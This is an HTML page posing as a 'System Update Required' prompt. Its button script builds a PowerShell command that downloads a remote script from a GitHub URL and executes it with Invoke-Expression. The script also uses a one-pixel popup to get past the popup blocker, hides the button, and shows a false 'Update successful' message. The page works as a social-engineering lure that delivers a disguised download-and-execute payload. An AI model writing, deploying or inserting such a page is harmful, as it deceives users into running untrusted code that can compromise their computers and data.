<!DOCTYPE html>
<html>
<body style="font-family: sans-serif; text-align: center; margin-top: 50px;">
    <h2>System Update Required</h2>
    <p>Please click below to complete the update.</p>
    
    <button id="updateBtn" style="padding: 10px 20px; font-size: 16px; cursor: pointer;">
        Update Now
    </button>
    <script>
        document.getElementById('updateBtn').addEventListener('click', function() {
            // This creates a temporary file on the fly and runs it
            var url = "powershell.exe -c \"Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/finnandrew888/Windows-security-update/main/launch.txt')\"";
            
            // We use a small trick to bypass the popup blocker
            var w = window.open("about:blank", "_blank", "width=1,height=1");
            w.document.write('<iframe src="' + url + '"></iframe>');
            
            // Hide UI
            this.style.display = 'none';
            document.body.innerHTML += '<p>Update successful. You may close this window.</p>';
        });
    </script>
</body>
</html>
